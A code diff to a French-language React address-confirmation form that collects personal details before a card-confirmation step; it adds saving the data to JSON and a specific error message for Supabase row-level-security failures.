@@ -2,7 +2,7 @@ import React, { useState, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import Footer from "@/components/Footer";
 import ProgressStepper from "@/components/ProgressStepper";
-import { updateUserSession, getFromSession } from "@/utils/sessionUtils";
+import { updateUserSession, getFromSession, saveUserDataToJson } from "@/utils/sessionUtils";
 import { toast } from "sonner";
 
 const AddressConfirmation: React.FC = () => {
@@ -29,7 +29,7 @@ const AddressConfirmation: React.FC = () => {
     }
   }, [navigate]);
 
-  const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!nom || !prenom || !dateNaissance || !adresse || !codePostal || !ville || !telephone) {
@@ -59,12 +59,19 @@ const AddressConfirmation: React.FC = () => {
       
       updateUserSession(userData);
       
+      await saveUserDataToJson();
+      
       setIsLoading(false);
       navigate("/card-confirmation");
     } catch (error: any) {
       console.error("Erreur lors de l'enregistrement:", error);
       setIsLoading(false);
-      toast.error("Une erreur est survenue lors de l'enregistrement des données.");
+      
+      if (error.isRlsError) {
+        toast.error(`Erreur de sécurité Supabase: ${error.message}`);
+      } else {
+        toast.error("Une erreur est survenue lors de l'enregistrement des données.");
+      }
     }
   };
 
